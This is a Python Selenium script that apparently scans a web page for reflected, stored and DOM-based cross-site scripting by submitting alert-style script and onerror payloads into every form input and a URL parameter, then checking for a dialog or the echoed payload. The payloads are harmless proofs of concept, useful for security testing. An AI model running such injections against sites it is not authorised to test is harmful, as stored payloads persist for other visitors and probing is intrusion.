import time
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Headless Chrome Setup
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
service = Service("/usr/bin/chromedriver")


def test_xss_reflected(url):
    payload = "<script>alert(1)</script>"
    driver = webdriver.Chrome(service=service, options=chrome_options)

    print("\n[🧪] Testing Reflected XSS...")
    try:
        driver.get(url)
        forms = driver.find_elements(By.TAG_NAME, "form")

        if not forms:
            print("[❌] No forms found.")
            return

        for i, form in enumerate(forms):
            inputs = form.find_elements(By.TAG_NAME, "input")
            test_inputs = [inp for inp in inputs if inp.get_attribute("type") != "submit"]

            for inp in test_inputs:
                inp.clear()
                inp.send_keys(payload)

            try:
                form.find_element(By.XPATH, ".//input[@type='submit'] | .//button[@type='submit']").click()
            except NoSuchElementException:
                form.submit()

            try:
                WebDriverWait(driver, 2).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert.dismiss()
                print(f"[✅] Reflected XSS Detected! Payload: {payload}")
                return
            except TimeoutException:
                pass

        print("[✓] Reflected XSS not detected.")
    except Exception as e:
        print(f"[❌] Error: {e}")
        traceback.print_exc()
    finally:
        driver.quit()


def test_xss_stored(url):
    payload = "<img src=x onerror=alert('xss')>"
    driver = webdriver.Chrome(service=service, options=chrome_options)

    print("\n[🧪] Testing Stored XSS...")
    try:
        driver.get(url)
        forms = driver.find_elements(By.TAG_NAME, "form")

        if not forms:
            print("[❌] No forms found.")
            return

        for i, form in enumerate(forms):
            inputs = form.find_elements(By.TAG_NAME, "input")
            test_inputs = [inp for inp in inputs if inp.get_attribute("type") != "submit"]

            for inp in test_inputs:
                inp.clear()
                inp.send_keys(payload)

            try:
                form.find_element(By.XPATH, ".//input[@type='submit'] | .//button[@type='submit']").click()
            except NoSuchElementException:
                form.submit()

            time.sleep(2)

            # Revisit page to see if payload persisted
            try:
                driver.get(url)
                WebDriverWait(driver, 2).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert.dismiss()
                print(f"[✅] Stored XSS Detected! Payload: {payload}")
                return
            except TimeoutException:
                if payload in driver.page_source:
                    print(f"[✅] Stored XSS Detected in Page Source! Payload: {payload}")
                    return
        print("[✓] Stored XSS not detected.")
    except Exception as e:
        print(f"[❌] Error: {e}")
        traceback.print_exc()
    finally:
        driver.quit()


def test_xss_dom(url):
    payload = "\"><script>alert('dom')</script>"
    test_url = f"{url}?x={payload}"
    driver = webdriver.Chrome(service=service, options=chrome_options)

    print("\n[🧪] Testing DOM-Based XSS...")
    try:
        driver.get(test_url)

        try:
            WebDriverWait(driver, 2).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert.dismiss()
            print(f"[✅] DOM XSS Detected! Payload: {payload}")
            return
        except TimeoutException:
            if payload in driver.page_source:
                print(f"[✅] DOM XSS Detected in HTML! Payload: {payload}")
                return

        print("[✓] DOM XSS not detected.")
    except Exception as e:
        print(f"[❌] Error: {e}")
        traceback.print_exc()
    finally:
        driver.quit()
